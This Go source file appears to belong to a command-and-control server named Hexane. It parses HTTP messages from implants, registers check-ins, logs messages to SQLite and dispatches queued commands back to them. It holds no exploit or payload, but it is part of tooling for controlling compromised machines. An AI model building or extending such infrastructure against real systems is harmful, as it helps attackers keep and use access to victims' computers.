package core

import (
	"fmt"
	"strconv"
)

const HeaderLength = 16

func ProcessBodyToParser(body []byte) (*Parser, error) {
	var parser *Parser

	WrapMessage("DBG", "creating parser from http body")
	if parser = CreateParser(body); parser == nil {
		return nil, fmt.Errorf("parser returned nil")
	}

	if parser.MsgLength < HeaderLength {
		return nil, fmt.Errorf("parser length is not long enough")
	}

	parser.PeerId = parser.ParseDword()
	parser.TaskId = parser.ParseDword()
	parser.MsgType = parser.ParseDword()
	parser.MsgLength = parser.ParseDword()

	return parser, nil

}

func (h *HexaneConfig) ProcessParser(parser *Parser) ([]byte, error) {
	switch parser.MsgType {

	case TypeCheckin:
		h.CommandChan = make(chan string, 5) // implant is checked-in
		h.Active = true

		parser.ParseTable()
		return []byte(strconv.Itoa(int(parser.PeerId))), nil

	case TypeResponse:
		parser.ParseTable()
		return h.DispatchCommand()

	case TypeTasking:
		return h.DispatchCommand()

	default:
		return nil, fmt.Errorf("unknown msg type: %v", parser.MsgType)
	}
}

func ResponseWorker(body []byte) ([]byte, error) {
	var (
		err    error
		config *HexaneConfig
		rsp    []byte
	)

	WrapMessage("DBG", DbgPrintBytes("http body: ", body))

	for len(body) > 0 {
		var parser *Parser
		if parser, err = ProcessBodyToParser(body); err != nil {
			return nil, fmt.Errorf("processing message to p: %s", err)
		}

		if config = GetConfigByPeerId(parser.PeerId); config != nil {
			if err = config.SqliteInsertParser(parser); err != nil {
				return []byte("200 ok"), err
			}

			if rsp, err = config.ProcessParser(parser); err != nil {
				return []byte("200 ok"), err
			}
		} else {
			WrapMessage("ERR", fmt.Sprintf("could not find peer in the database: %d", parser.PeerId))
			rsp = []byte("200 ok")
		}

		if parser.MsgLength < uint32(len(body)) {
			body = body[parser.MsgLength:]
		} else {
			body = nil
		}
	}

	return rsp, err
}
